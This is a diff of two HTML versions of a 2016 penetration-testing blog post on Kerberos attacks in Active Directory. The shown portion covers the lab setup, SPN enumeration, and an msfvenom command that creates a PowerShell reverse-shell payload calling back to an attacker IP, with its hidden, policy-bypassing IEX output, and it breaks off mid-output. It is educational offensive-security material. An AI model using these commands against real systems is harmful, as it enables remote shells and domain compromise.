@@ -1,287 +1,159 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> kerberos, kerberoast and golden tickets | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="kerberos, kerberoast and golden tickets" />
+<title>
+kerberos, kerberoast and golden tickets ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content=" Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
+The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
+This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!
+">
+<meta name=keywords content="kerberos,golden ticket,kerberoast,rc4">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="kerberos, kerberoast and golden tickets">
+<meta name=twitter:description content="
+    
+    
+  
+
+
+Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
+The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
+This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!">
+<meta property="og:title" content="kerberos, kerberoast and golden tickets">
 <meta property="og:description" content="
+    
+    
+  
 
 
 Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
 The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
-This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2016-01-09T10:12:09+02:00" />
-<meta property="article:modified_time" content="2016-01-09T10:12:09+02:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="kerberos, kerberoast and golden tickets"/>
-<meta name="twitter:description" content="
-
-
-Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
-The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
-This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!"/>
-
-  
-  
-    
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-  
-  
+This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2016-01-09T10:12:09+02:00">
+<meta property="article:modified_time" content="2016-01-09T10:12:09+02:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/license/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#lets-set-the-scene">lets set the scene</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#spn-scanning---the-offensive-perspective">spn scanning - the offensive perspective</a>
-      <ul>
-        <li><a href="#setup-a-powershell-connection">setup a powershell connection</a></li>
-      </ul>
-    </li>
-    <li><a href="#kerberos-service-tickets">kerberos service tickets</a></li>
-    <li><a href="#enter-kerberoast">enter kerberoast</a></li>
-    <li><a href="#dumping-kerberos-tickets-from-memory">dumping kerberos tickets from memory</a></li>
-    <li><a href="#cracking-the-kerberos-ticket">cracking the kerberos ticket</a></li>
-    <li><a href="#testing-the-credentials">testing the credentials</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#creating-the-golden-ticket">creating the golden ticket</a></li>
-    <li><a href="#injecting-the-golden-ticket">injecting the golden ticket</a></li>
-    <li><a href="#conclusion">conclusion</a></li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>kerberos, kerberoast and golden tickets</h1>
+<div class=post-meta>
+<span class=post-date>
+2016-01-09
+</span>
+<span class=post-read-time>— 16 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        kerberos, kerberoast and golden tickets
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2016-01-09 10:12:09 &#43;0200 SAST" itemprop="datePublished">2016-01-09</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/active-directory">active directory</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/kerberos">kerberos</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/golden-ticket">golden ticket</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png"/>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#lets-set-the-scene>lets set the scene</a></li>
+</ul>
+</li>
+<li><a href=#spn-scanning---the-setup>spn scanning - the setup</a>
+<ul>
+<li><a href=#spn-scanning---the-offensive-perspective>spn scanning - the offensive perspective</a>
+<ul>
+<li><a href=#setup-a-powershell-connection>setup a powershell connection</a></li>
+</ul>
+</li>
+<li><a href=#kerberos-service-tickets>kerberos service tickets</a></li>
+<li><a href=#enter-kerberoast>enter kerberoast</a></li>
+<li><a href=#dumping-kerberos-tickets-from-memory>dumping kerberos tickets from memory</a></li>
+<li><a href=#cracking-the-kerberos-ticket>cracking the kerberos ticket</a></li>
+<li><a href=#testing-the-credentials>testing the credentials</a></li>
+</ul>
+</li>
+<li><a href=#golden-tickets>golden tickets</a>
+<ul>
+<li><a href=#creating-the-golden-ticket>creating the golden ticket</a></li>
+<li><a href=#injecting-the-golden-ticket>injecting the golden ticket</a></li>
+<li><a href=#conclusion>conclusion</a></li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_active_directory_logo.png>
 </figure>
-
 <p>Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?</p>
-<p>The reality is, <em>many</em> times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of <code>lsass</code> and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to <a href="https://github.com/sensepost/autoDANE">automate</a> this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!</p>
+<p>The reality is, <em>many</em> times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of <code>lsass</code> and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to <a href=https://github.com/sensepost/autoDANE>automate</a> this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!</p>
 <p>This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!</p>
-<h2 id="lets-set-the-scene">lets set the scene</h2>
+<h2 id=lets-set-the-scene>lets set the scene</h2>
 <p>Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:</p>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Kerberos_%28protocol%29">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a></li>
-<li><a href="https://technet.microsoft.com/en-us/library/cc772815%28v%3Dws.10%29.aspx">https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx</a></li>
-<li><a href="http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/">http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</a></li>
+<li><a href=https://en.wikipedia.org/wiki/Kerberos_%28protocol%29>https://en.wikipedia.org/wiki/Kerberos_(protocol)</a></li>
+<li><a href=https://technet.microsoft.com/en-us/library/cc772815%28v%3Dws.10%29.aspx>https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx</a></li>
+<li><a href=http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/>http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</a></li>
 <li><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></li>
 </ul>
 <p>For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the <em>foo.local</em> domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &lsquo;attacker&rsquo; on the same subnet as all of these Windows computers.</p>
 <p>One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_initial_meterpreter.png>
 </figure>
-
 <p>One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.</p>
-<h1 id="spn-scanning---the-setup">spn scanning - the setup</h1>
-<p>One of the avenues we can pursue now is to query Active Directory for objects that have a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949%28v%3Dvs.85%29.aspx">Service Principal Name</a> set.</p>
+<h1 id=spn-scanning---the-setup>spn scanning - the setup</h1>
+<p>One of the avenues we can pursue now is to query Active Directory for objects that have a <a href=https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949%28v%3Dvs.85%29.aspx>Service Principal Name</a> set.</p>
 <blockquote>
 <p>A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.</p>
 </blockquote>
-<p>Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&rsquo;s in my lab are running an instance of <a href="https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx">SQL Server 2014 Express</a>, configured to run with the <code>svcSQLServ</code> domain service account.</p>
+<p>Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&rsquo;s in my lab are running an instance of <a href=https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx>SQL Server 2014 Express</a>, configured to run with the <code>svcSQLServ</code> domain service account.</p>
 <blockquote>
 <p>When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.</p>
 </blockquote>
 <p>On my domain controller, I configured the SPN&rsquo;s with the following commands:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
 Checking domain DC=foo,DC=local
 
 Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
@@ -294,44 +166,44 @@ Checking domain DC=foo,DC=local
 Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
         svcSQLServ/pc2.foo.local:1433
 Updated object
-</code></pre></div><h2 id="spn-scanning---the-offensive-perspective">spn scanning - the offensive perspective</h2>
+</code></pre></div><h2 id=spn-scanning---the-offensive-perspective>spn scanning - the offensive perspective</h2>
 <p>Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a <em>free port scan</em> done too. You will see in a moment. =]</p>
-<p>Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you <a href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts">here</a>. The gist of it is this LDAP search <code>(&amp;(objectcategory=user)(serviceprincipalname=*))</code>.</p>
+<p>Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you <a href=https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts>here</a>. The gist of it is this LDAP search <code>(&(objectcategory=user)(serviceprincipalname=*))</code>.</p>
 <p>To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn <code>powershell.exe</code> from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.</p>
-<h3 id="setup-a-powershell-connection">setup a powershell connection</h3>
+<h3 id=setup-a-powershell-connection>setup a powershell connection</h3>
 <p>We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the <code>exec_powershell</code> post module. In a new terminal, run <code>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p windows/powershell_reverse_tcp <span style="color:#eedd82">LHOST</span>=192.168.138.150 <span style="color:#eedd82">LPORT</span>=<span style="color:#f60">4445</span> -t raw
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.138.150 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4445</span> -t raw
 No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No Arch selected, selecting Arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
-Payload size: <span style="color:#f60">1727</span> bytes
-���<span style="color:#87ceeb">`</span>��1�d�P0�R
-�8�u�}�;}<span style="color:#eedd82">$u</span>�X�X$�f�Y ӋI�:I�4��1����
-                      K�XӋ�ЉD<span style="color:#eedd82">$$</span>[[aYZQ��__Z���]j���Ph1�o��ջ���Vh������&lt;|
-���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX <span style="color:#f00">$(</span><span style="color:#eedd82">$s</span>=New-Object IO.MemoryStream(,[Convert]::FromBase64String(<span style="color:#87ceeb">&#39;H4sIABX0kF ... snip ... AAA=&#39;</span><span style="color:#f00">)</span>);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(<span style="color:#eedd82">$s</span>,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
+Payload size: <span style=color:#ae81ff>1727</span> bytes
+���<span style=color:#e6db74>`</span>��1�d�P0�R
+�8�u�<span style=color:#f92672>}</span>�;<span style=color:#f92672>}</span>$u�X�X$�f�Y ӋI�:I�4��1����
+                      K�XӋ�ЉD$$<span style=color:#f92672>[[</span>aYZQ��__Z���<span style=color:#f92672>]</span>j���Ph1�o��ջ���Vh������&lt;|
+���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX <span style=color:#66d9ef>$(</span>$s<span style=color:#f92672>=</span>New-Object IO.MemoryStream<span style=color:#f92672>(</span>,<span style=color:#f92672>[</span>Convert<span style=color:#f92672>]</span>::FromBase64String<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;H4sIABX0kF ... snip ... AAA=&#39;</span><span style=color:#66d9ef>)</span><span style=color:#f92672>)</span>;IEX <span style=color:#f92672>(</span>New-Object IO.StreamReader<span style=color:#f92672>(</span>New-Object IO.Compression.GzipStream<span style=color:#f92672>(</span>$s,<span style=color:#f92672>[</span>IO.Compression.CompressionMode<span style=color:#f92672>]</span>::Decompress<span style=color:#f92672>)))</span>.ReadToEnd<span style=color:#f92672>()</span>;<span style=color:#f92672>)</span>
